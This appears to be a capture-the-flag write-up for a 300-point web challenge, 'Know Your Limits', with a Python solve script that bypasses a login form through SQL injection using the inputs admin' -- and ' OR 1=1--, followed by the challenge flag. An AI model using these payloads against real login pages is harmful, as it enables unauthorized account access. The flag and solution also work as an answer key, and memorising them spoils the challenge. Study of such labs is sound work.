---
title: "Know Your Limits"
ctf: "Safaricom CTF"
date: 2026-10-04
category: web
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "safaricom-ctf-team"
---

# Know Your Limits

## Summary

- **Category:** web

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Know Your Limits (web, 300 pts) - http://54.72.82.22:8060

"POLE POSITION" motorsport paddock login. Despite the name (and the rate-limit
red herring - 30 rapid attempts all return 200 with no throttling), the bug is a
textbook SQL injection in the login query.

Auth bypass by commenting out the password check:

    username = admin' --
    password = anything

    -> "Welcome back user admin, safctf{30f33ad5be8abc02f034b5b266ff6b81}"

The `' OR 1=1--` form authenticates as the FIRST row (user `test`) and tells you
where the flag lives: "Welcome back user test, Flag at admin user".

'Know your LIMITS' is the SQL keyword hint.
"""
import urllib.request, urllib.parse, re, html

BASE = "http://54.72.82.22:8060"
FLAG = "safctf{30f33ad5be8abc02f034b5b266ff6b81}"


def login(user, pw):
    data = urllib.parse.urlencode({"username": user, "password": pw}).encode()
    req = urllib.request.Request(BASE + "/", data=data)
    with urllib.request.urlopen(req, timeout=10) as r:
        page = r.read().decode("utf-8", "replace")
    body = re.sub(r"<style.*?</style>", "", page, flags=re.S)
    tail = body[body.find("</form>"):]
    return html.unescape(re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", tail))).strip()


def main():
    print("baseline     :", login("admin", "wrong"))
    print("OR 1=1 (test):", login("' OR 1=1--", "x"))
    print("bypass       :", login("admin' --", "x"))
    assert FLAG in login("admin' --", "x")


if __name__ == "__main__":
    main()

```

## Flag

```
safctf{30f33ad5be8abc02f034b5b266ff6b81}
```
